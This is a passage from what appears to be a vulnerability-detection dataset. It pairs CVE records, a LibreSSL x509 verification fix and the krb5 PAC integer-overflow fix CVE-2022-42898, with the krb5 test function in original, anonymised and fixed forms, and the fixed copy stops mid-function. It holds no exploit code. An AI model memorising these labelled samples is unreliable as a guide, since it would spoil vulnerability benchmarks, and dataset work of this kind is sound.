 }","{'deleted_lines': ['\tif (!x509_verify_cert_valid(ctx, leaf, NULL))', '\t\treturn 0;', '', '\tif (!x509_verify_cert_hostname(ctx, leaf, name))', '\t\treturn 0;', '', '\tctx->chains_count++;'], 'added_lines': ['\t/* Verify the leaf certificate and store any resulting error. */', '\tif (!x509_verify_cert_valid(ctx, leaf, NULL))', '\t\treturn 0;', '\tif (!x509_verify_cert_hostname(ctx, leaf, name))', '\t\treturn 0;', '\tif (ctx->error_depth == 0 &&', '\t    ctx->error != X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)', '\t\tchain->cert_errors[0] = ctx->error;', '', '\tctx->chains_count++;', '']}",True,"An issue was discovered in x509/x509_verify.c in LibreSSL before 3.6.1, and in OpenBSD before 7.2 errata 001. x509_verify_ctx_add_chain does not store errors that occur during leaf certificate verification, and therefore an incorrect error is returned. This behavior occurs when there is an installed verification callback that instructs the verifier to continue upon detecting an invalid certificate.",5.3,MEDIUM,1,valid,2022-10-17T18:56:54Z,4
CVE-2022-42898,['CWE-190'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,krb5,"Fix integer overflows in PAC parsing

In krb5_parse_pac(), check for buffer counts large enough to threaten
integer overflow in the header length and memory length calculations.
Avoid potential integer overflows when checking the length of each
buffer.  Credit to OSS-Fuzz for discovering one of the issues.

CVE-2022-42898:

In MIT krb5 releases 1.8 and later, an authenticated attacker may be
able to cause a KDC or kadmind process to crash by reading beyond the
bounds of allocated memory, creating a denial of service.  A
privileged attacker may similarly be able to cause a Kerberos or GSS
application service to crash.  On 32-bit platforms, an attacker can
also cause insufficient memory to be allocated for the result,
potentially leading to remote code execution in a KDC, kadmind, or GSS
or Kerberos application server process.  An attacker with the
privileges of a cross-realm KDC may be able to extract secrets from a
KDC process's memory by having them copied into the PAC of a new
ticket.

ticket: 9074 (new)
tags: pullup
target_version: 1.20-next
target_version: 1.19-next",ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583,https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583,src/lib/krb5/krb/t_pac.c,main,"int
main(int argc, char **argv)
{
krb5_error_code ret;
krb5_context context;
krb5_pac pac;
krb5_data data;
krb5_principal p;
ret = krb5_init_context(&context);
if (ret)
err(NULL, 0, ""krb5_init_contex"");
test_pac_ticket_signature(context);
ret = krb5_set_default_realm(context, ""WIN2K3.THINKER.LOCAL"");
if (ret)
err(context, ret, ""krb5_set_default_realm"");
ret = krb5_parse_name(context, user, &p);
if (ret)
err(context, ret, ""krb5_parse_name"");
check_pac(context, -1, saved_pac, sizeof(saved_pac), authtime, p,
type_1_length, 0, &member_keyblock, &kdc_keyblock);
{
krb5_principal sp;
krb5_principal sep;
const struct pac_and_info *pi;
ret = krb5_parse_name(context, s4u_principal, &sp);
if (ret)
err(context, ret, ""krb5_parse_name"");
ret = krb5_parse_name_flags(context, s4u_enterprise,
KRB5_PRINCIPAL_PARSE_ENTERPRISE, &sep);
if (ret)
err(context, ret, ""krb5_parse_name_flags"");
for (pi = s4u_pacs; pi->data != NULL; pi++) {
check_pac(context, pi - s4u_pacs, pi->data, pi->length,
pi->authtime, pi->is_enterprise ? sep : sp,
s4u_logon_info_buffer_len, pi->is_xrealm,
pi->is_xrealm ? &s4u_tgt_srv_key : &s4u_srv_key, NULL);
}
krb5_free_principal(context, sp);
krb5_free_principal(context, sep);
}
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
krb5_pac_free(context, pac);
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
{
const krb5_data cdata = { 0, 2, ""\x00\x01"" } ;
ret = krb5_pac_add_buffer(context, pac, 1, &cdata);
if (ret)
err(context, ret, ""krb5_pac_add_buffer"");
}
{
ret = krb5_pac_get_buffer(context, pac, 1, &data);
if (ret)
err(context, ret, ""krb5_pac_get_buffer"");
if (data.length != 2 || memcmp(data.data, ""\x00\x01"", 2) != 0)
err(context, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(context, &data);
}
{
const krb5_data cdata = { 0, 2, ""\x02\x00"" } ;
ret = krb5_pac_add_buffer(context, pac, 2, &cdata);
if (ret)
err(context, ret, ""krb5_pac_add_buffer"");
}
{
ret = krb5_pac_get_buffer(context, pac, 1, &data);
if (ret)
err(context, ret, ""krb5_pac_get_buffer"");
if (data.length != 2 || memcmp(data.data, ""\x00\x01"", 2) != 0)
err(context, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(context, &data);
ret = krb5_pac_get_buffer(context, pac, 2, &data);
if (ret)
err(context, ret, ""krb5_pac_get_buffer"");
if (data.length != 2 || memcmp(data.data, ""\x02\x00"", 2) != 0)
err(context, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(context, &data);
}
ret = krb5_pac_sign(context, pac, authtime, p,
&member_keyblock, &kdc_keyblock, &data);
if (ret)
err(context, ret, ""krb5_pac_sign"");
krb5_pac_free(context, pac);
ret = krb5_pac_parse(context, data.data, data.length, &pac);
krb5_free_data_contents(context, &data);
if (ret)
err(context, ret, ""krb5_pac_parse 3"");
ret = krb5_pac_verify(context, pac, authtime, p,
&member_keyblock, &kdc_keyblock);
if (ret)
err(context, ret, ""krb5_pac_verify 3"");
{
uint32_t *list;
size_t len;
ret = krb5_pac_get_types(context, pac, &len, &list);
if (ret)
err(context, ret, ""krb5_pac_get_types"");
if (len != 5)
err(context, 0, ""list wrong length"");
free(list);
}
{
krb5_principal ep, np;
ret = krb5_parse_name_flags(context, user,
KRB5_PRINCIPAL_PARSE_ENTERPRISE, &ep);
if (ret)
err(context, ret, ""krb5_parse_name_flags"");
ret = krb5_copy_principal(context, ep, &np);
if (ret)
err(context, ret, ""krb5_copy_principal"");
np->type = KRB5_NT_MS_PRINCIPAL;
ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
ret = krb5_pac_sign(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock, &data);
if (!ret)
err(context, ret, ""krb5_pac_sign should have failed"");
ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock, TRUE);
if (!ret)
err(context, ret, ""krb5_pac_verify_ext with realm should fail"");
ret = krb5_pac_sign_ext(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock, TRUE, &data);
if (!ret)
err(context, ret, ""krb5_pac_sign_ext with realm should fail"");
krb5_pac_free(context, pac);
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
ret = krb5_pac_sign(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock, &data);
if (ret)
err(context, ret, ""krb5_pac_sign enterprise failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_parse(context, data.data, data.length, &pac);
krb5_free_data_contents(context, &data);
if (ret)
err(context, ret, ""krb5_pac_parse failed"");
ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock);
if (ret)
err(context, ret, ""krb5_pac_verify enterprise failed"");
ret = krb5_pac_verify(context, pac, authtime, np, &member_keyblock,
&kdc_keyblock);
if (ret)
err(context, ret, ""krb5_pac_verify enterprise as nt-ms failed"");
ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
ret = krb5_pac_sign(context, pac, authtime, np, &member_keyblock,
&kdc_keyblock, &data);
if (ret)
err(context, ret, ""krb5_pac_sign enterprise failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_parse(context, data.data, data.length, &pac);
krb5_free_data_contents(context, &data);
if (ret)
err(context, ret, ""krb5_pac_parse failed"");
ret = krb5_pac_verify(context, pac, authtime, np, &member_keyblock,
&kdc_keyblock);
if (ret)
err(context, ret, ""krb5_pac_verify enterprise failed"");
ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock);
if (ret)
err(context, ret, ""krb5_pac_verify nt-ms as enterprise failed"");
ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
ret = krb5_pac_sign_ext(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock, TRUE, &data);
if (ret)
err(context, ret, ""krb5_pac_sign_ext with realm failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_parse(context, data.data, data.length, &pac);
krb5_free_data_contents(context, &data);
if (ret)
err(context, ret, ""krb5_pac_parse failed"");
ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock, TRUE);
if (ret)
err(context, ret, ""krb5_pac_verify_ext with realm failed"");
ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_init(context, &pac);
if (ret)
err(context, ret, ""krb5_pac_init"");
ret = krb5_pac_sign_ext(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock, TRUE, &data);
if (ret)
err(context, ret, ""krb5_pac_sign_ext ent with realm failed"");
krb5_pac_free(context, pac);
ret = krb5_pac_parse(context, data.data, data.length, &pac);
krb5_free_data_contents(context, &data);
if (ret)
err(context, ret, ""krb5_pac_parse failed"");
ret = krb5_pac_verify_ext(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock, TRUE);
if (ret)
err(context, ret, ""krb5_pac_verify_ext ent with realm failed"");
ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
&kdc_keyblock);
if (!ret)
err(context, ret, ""krb5_pac_verify should have failed"");
ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
&kdc_keyblock, TRUE);
if (!ret)
err(context, ret, ""krb5_pac_verify_ext should have failed"");
krb5_free_principal(context, ep);
krb5_free_principal(context, np);
}
krb5_pac_free(context, pac);
krb5_free_principal(context, p);
krb5_free_context(context);
return 0;
}","int
main(int VAR_0, char **VAR_1)
{
krb5_error_code VAR_2;
krb5_context VAR_3;
krb5_pac VAR_4;
krb5_data VAR_5;
krb5_principal VAR_6;
VAR_2 = krb5_init_context(&VAR_3);
if (VAR_2)
err(NULL, 0, ""krb5_init_contex"");
test_pac_ticket_signature(VAR_3);
VAR_2 = krb5_set_default_realm(VAR_3, ""WIN2K3.THINKER.LOCAL"");
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_set_default_realm"");
VAR_2 = krb5_parse_name(VAR_3, VAR_7, &VAR_6);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_parse_name"");
check_pac(VAR_3, -1, VAR_8, sizeof(VAR_8), VAR_9, VAR_6,
VAR_10, 0, &VAR_11, &VAR_12);
{
krb5_principal VAR_13;
krb5_principal VAR_14;
const struct pac_and_info *VAR_15;
VAR_2 = krb5_parse_name(VAR_3, VAR_16, &VAR_13);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_parse_name"");
VAR_2 = krb5_parse_name_flags(VAR_3, VAR_17,
VAR_18, &VAR_14);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_parse_name_flags"");
for (VAR_15 = VAR_19; VAR_15->data != NULL; VAR_15++) {
check_pac(VAR_3, VAR_15 - VAR_19, VAR_15->data, VAR_15->length,
VAR_15->authtime, VAR_15->is_enterprise ? VAR_14 : VAR_13,
VAR_20, VAR_15->is_xrealm,
VAR_15->is_xrealm ? &VAR_21 : &VAR_22, NULL);
}
krb5_free_principal(VAR_3, VAR_13);
krb5_free_principal(VAR_3, VAR_14);
}
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
{
const krb5_data VAR_23 = { 0, 2, ""\x00\x01"" } ;
VAR_2 = krb5_pac_add_buffer(VAR_3, VAR_4, 1, &VAR_23);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_add_buffer"");
}
{
VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 1, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x00\x01"", 2) != 0)
err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(VAR_3, &VAR_5);
}
{
const krb5_data VAR_23 = { 0, 2, ""\x02\x00"" } ;
VAR_2 = krb5_pac_add_buffer(VAR_3, VAR_4, 2, &VAR_23);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_add_buffer"");
}
{
VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 1, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x00\x01"", 2) != 0)
err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(VAR_3, &VAR_5);
VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 2, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x02\x00"", 2) != 0)
err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
krb5_free_data_contents(VAR_3, &VAR_5);
}
VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_6,
&VAR_11, &VAR_12, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
krb5_free_data_contents(VAR_3, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_parse 3"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6,
&VAR_11, &VAR_12);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify 3"");
{
uint32_t *VAR_24;
size_t VAR_25;
VAR_2 = krb5_pac_get_types(VAR_3, VAR_4, &VAR_25, &VAR_24);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_get_types"");
if (VAR_25 != 5)
err(VAR_3, 0, ""list wrong length"");
free(VAR_24);
}
{
krb5_principal VAR_26, VAR_27;
VAR_2 = krb5_parse_name_flags(VAR_3, VAR_7,
VAR_18, &VAR_26);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_parse_name_flags"");
VAR_2 = krb5_copy_principal(VAR_3, VAR_26, &VAR_27);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_copy_principal"");
VAR_27->type = VAR_28;
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12, &VAR_5);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign should have failed"");
VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12, TRUE);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify_ext with realm should fail"");
VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12, TRUE, &VAR_5);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign_ext with realm should fail"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign enterprise failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
krb5_free_data_contents(VAR_3, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_parse failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify enterprise failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_27, &VAR_11,
&VAR_12);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify enterprise as nt-ms failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_27, &VAR_11,
&VAR_12, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign enterprise failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
krb5_free_data_contents(VAR_3, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_parse failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_27, &VAR_11,
&VAR_12);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify enterprise failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify nt-ms as enterprise failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12, TRUE, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign_ext with realm failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
krb5_free_data_contents(VAR_3, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_parse failed"");
VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12, TRUE);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify_ext with realm failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_init"");
VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12, TRUE, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_sign_ext ent with realm failed"");
krb5_pac_free(VAR_3, VAR_4);
VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
krb5_free_data_contents(VAR_3, &VAR_5);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_parse failed"");
VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12, TRUE);
if (VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify_ext ent with realm failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_26, &VAR_11,
&VAR_12);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");
VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
&VAR_12, TRUE);
if (!VAR_2)
err(VAR_3, VAR_2, ""krb5_pac_verify_ext should have failed"");
krb5_free_principal(VAR_3, VAR_26);
krb5_free_principal(VAR_3, VAR_27);
}
krb5_pac_free(VAR_3, VAR_4);
krb5_free_principal(VAR_3, VAR_6);
krb5_free_context(VAR_3);
return 0;
}",krb5/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583/t_pac.c/vul/before/0.json,"int
main(int argc, char **argv)
{
    krb5_error_code ret;
    krb5_context context;
    krb5_pac pac;
    krb5_data data;
    krb5_principal p;

    ret = krb5_init_context(&context);
    if (ret)
        err(NULL, 0, ""krb5_init_contex"");

    test_pac_ticket_signature(context);

    ret = krb5_set_default_realm(context, ""WIN2K3.THINKER.LOCAL"");
    if (ret)
        err(context, ret, ""krb5_set_default_realm"");

    ret = krb5_parse_name(context, user, &p);
    if (ret)
        err(context, ret, ""krb5_parse_name"");

    /* Check a pre-saved PAC. */
    check_pac(context, -1, saved_pac, sizeof(saved_pac), authtime, p,
              type_1_length, 0, &member_keyblock, &kdc_keyblock);

    /* Check S4U2Self PACs. */
    {
        krb5_principal sp;
        krb5_principal sep;
        const struct pac_and_info *pi;

        ret = krb5_parse_name(context, s4u_principal, &sp);
        if (ret)
            err(context, ret, ""krb5_parse_name"");

        ret = krb5_parse_name_flags(context, s4u_enterprise,
                                    KRB5_PRINCIPAL_PARSE_ENTERPRISE, &sep);
        if (ret)
            err(context, ret, ""krb5_parse_name_flags"");

        for (pi = s4u_pacs; pi->data != NULL; pi++) {
            check_pac(context, pi - s4u_pacs, pi->data, pi->length,
                      pi->authtime, pi->is_enterprise ? sep : sp,
                      s4u_logon_info_buffer_len, pi->is_xrealm,
                      pi->is_xrealm ? &s4u_tgt_srv_key : &s4u_srv_key, NULL);
        }

        krb5_free_principal(context, sp);
        krb5_free_principal(context, sep);
    }

    /* Check problematic PACs found by fuzzing. */
    ret = krb5_pac_parse(context, fuzz1, sizeof(fuzz1), &pac);
    if (!ret)
        err(context, ret, ""krb5_pac_parse should have failed"");
    ret = krb5_pac_parse(context, fuzz2, sizeof(fuzz2), &pac);
    if (!ret)
        err(context, ret, ""krb5_pac_parse should have failed"");

    /*
     * Test empty free
     */

    ret = krb5_pac_init(context, &pac);
    if (ret)
        err(context, ret, ""krb5_pac_init"");
    krb5_pac_free(context, pac);

    /*
     * Test add remove buffer
     */

    ret = krb5_pac_init(context, &pac);
    if (ret)
        err(context, ret, ""krb5_pac_init"");

    {
        const krb5_data cdata = { 0, 2, ""\x00\x01"" } ;

        ret = krb5_pac_add_buffer(context, pac, 1, &cdata);
        if (ret)
            err(context, ret, ""krb5_pac_add_buffer"");
    }
    {
        ret = krb5_pac_get_buffer(context, pac, 1, &data);
        if (ret)
            err(context, ret, ""krb5_pac_get_buffer"");
        if (data.length != 2 || memcmp(data.data, ""\x00\x01"", 2) != 0)
            err(context, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(context, &data);
    }

    {
        const krb5_data cdata = { 0, 2, ""\x02\x00"" } ;

        ret = krb5_pac_add_buffer(context, pac, 2, &cdata);
        if (ret)
            err(context, ret, ""krb5_pac_add_buffer"");
    }
    {
        ret = krb5_pac_get_buffer(context, pac, 1, &data);
        if (ret)
            err(context, ret, ""krb5_pac_get_buffer"");
        if (data.length != 2 || memcmp(data.data, ""\x00\x01"", 2) != 0)
            err(context, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(context, &data);
        /* */
        ret = krb5_pac_get_buffer(context, pac, 2, &data);
        if (ret)
            err(context, ret, ""krb5_pac_get_buffer"");
        if (data.length != 2 || memcmp(data.data, ""\x02\x00"", 2) != 0)
            err(context, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(context, &data);
    }

    ret = krb5_pac_sign(context, pac, authtime, p,
                        &member_keyblock, &kdc_keyblock, &data);
    if (ret)
        err(context, ret, ""krb5_pac_sign"");

    krb5_pac_free(context, pac);

    ret = krb5_pac_parse(context, data.data, data.length, &pac);
    krb5_free_data_contents(context, &data);
    if (ret)
        err(context, ret, ""krb5_pac_parse 3"");

    ret = krb5_pac_verify(context, pac, authtime, p,
                          &member_keyblock, &kdc_keyblock);
    if (ret)
        err(context, ret, ""krb5_pac_verify 3"");

    {
        uint32_t *list;
        size_t len;

        /* our two user buffer plus the three ""system"" buffers */
        ret = krb5_pac_get_types(context, pac, &len, &list);
        if (ret)
            err(context, ret, ""krb5_pac_get_types"");
        if (len != 5)
            err(context, 0, ""list wrong length"");
        free(list);
    }

    {
        krb5_principal ep, np;

        ret = krb5_parse_name_flags(context, user,
                                    KRB5_PRINCIPAL_PARSE_ENTERPRISE, &ep);
        if (ret)
            err(context, ret, ""krb5_parse_name_flags"");

        ret = krb5_copy_principal(context, ep, &np);
        if (ret)
            err(context, ret, ""krb5_copy_principal"");
        np->type = KRB5_NT_MS_PRINCIPAL;

        /* Try to verify as enterprise. */
        ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        ret = krb5_pac_sign(context, pac, authtime, ep, &member_keyblock,
                            &kdc_keyblock, &data);
        if (!ret)
            err(context, ret, ""krb5_pac_sign should have failed"");

        /* Try to verify with realm. */
        ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
                                  &kdc_keyblock, TRUE);
        if (!ret)
            err(context, ret, ""krb5_pac_verify_ext with realm should fail"");

        /* Currently we can't re-sign the PAC with realm (although that could
         * be useful), only sign a new one. */
        ret = krb5_pac_sign_ext(context, pac, authtime, p, &member_keyblock,
                                &kdc_keyblock, TRUE, &data);
        if (!ret)
            err(context, ret, ""krb5_pac_sign_ext with realm should fail"");

        krb5_pac_free(context, pac);

        /* Test enterprise. */
        ret = krb5_pac_init(context, &pac);
        if (ret)
            err(context, ret, ""krb5_pac_init"");

        ret = krb5_pac_sign(context, pac, authtime, ep, &member_keyblock,
                            &kdc_keyblock, &data);
        if (ret)
            err(context, ret, ""krb5_pac_sign enterprise failed"");

        krb5_pac_free(context, pac);

        ret = krb5_pac_parse(context, data.data, data.length, &pac);
        krb5_free_data_contents(context, &data);
        if (ret)
            err(context, ret, ""krb5_pac_parse failed"");

        ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
                              &kdc_keyblock);
        if (ret)
            err(context, ret, ""krb5_pac_verify enterprise failed"");

        /* Also verify enterprise as KRB5_NT_MS_PRINCIPAL. */
        ret = krb5_pac_verify(context, pac, authtime, np, &member_keyblock,
                              &kdc_keyblock);
        if (ret)
            err(context, ret, ""krb5_pac_verify enterprise as nt-ms failed"");

        ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        krb5_pac_free(context, pac);

        /* Test nt-ms-principal. */
        ret = krb5_pac_init(context, &pac);
        if (ret)
            err(context, ret, ""krb5_pac_init"");

        ret = krb5_pac_sign(context, pac, authtime, np, &member_keyblock,
                            &kdc_keyblock, &data);
        if (ret)
            err(context, ret, ""krb5_pac_sign enterprise failed"");

        krb5_pac_free(context, pac);

        ret = krb5_pac_parse(context, data.data, data.length, &pac);
        krb5_free_data_contents(context, &data);
        if (ret)
            err(context, ret, ""krb5_pac_parse failed"");

        ret = krb5_pac_verify(context, pac, authtime, np, &member_keyblock,
                              &kdc_keyblock);
        if (ret)
            err(context, ret, ""krb5_pac_verify enterprise failed"");

        /* Also verify as enterprise principal. */
        ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
                              &kdc_keyblock);
        if (ret)
            err(context, ret, ""krb5_pac_verify nt-ms as enterprise failed"");

        ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        krb5_pac_free(context, pac);

        /* Test with realm. */
        ret = krb5_pac_init(context, &pac);
        if (ret)
            err(context, ret, ""krb5_pac_init"");

        ret = krb5_pac_sign_ext(context, pac, authtime, p, &member_keyblock,
                                &kdc_keyblock, TRUE, &data);
        if (ret)
            err(context, ret, ""krb5_pac_sign_ext with realm failed"");

        krb5_pac_free(context, pac);

        ret = krb5_pac_parse(context, data.data, data.length, &pac);
        krb5_free_data_contents(context, &data);
        if (ret)
            err(context, ret, ""krb5_pac_parse failed"");

        ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
                                  &kdc_keyblock, TRUE);
        if (ret)
